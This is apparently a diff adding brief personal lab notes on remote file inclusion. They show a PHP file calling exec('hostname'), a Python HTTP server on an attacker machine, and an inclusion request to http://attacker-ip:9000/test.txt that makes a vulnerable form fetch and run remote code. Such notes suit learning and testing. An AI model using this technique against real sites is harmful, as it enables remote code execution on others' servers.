@@ -1,0 +1,13 @@
+RFI - remote file inclusion
+
+file inclusion form
+
+on attack machine we create a file to execute command hostname when it is included in form
+
+nano test.txt
+<?php echo exec("hostname");?> ctrl+o-enter-ctrl+x
+
+we start a http server on port 9000 on atacker machine
+python3 -m http.server 9000
+
+in file incusion form we interogate for> http://attacker-ip:9000/test.txt
